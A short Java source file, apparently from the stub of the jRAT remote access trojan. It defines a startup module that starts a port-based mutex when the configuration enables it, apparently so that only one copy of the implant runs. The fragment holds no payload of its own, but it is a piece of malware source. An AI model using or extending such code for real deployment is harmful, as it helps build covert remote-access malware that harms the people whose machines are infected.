package io.jrat.stub.modules.startup;

import io.jrat.stub.Configuration;
import io.jrat.stub.Mutex;
import java.util.Map;

public class MutexStartupModule extends StartupModule {
	
	public MutexStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		if (Boolean.parseBoolean(Configuration.getConfig().get("mutex"))) {
			new Mutex(Integer.parseInt(Configuration.getConfig().get("mport"))).start();
		}
	}

}
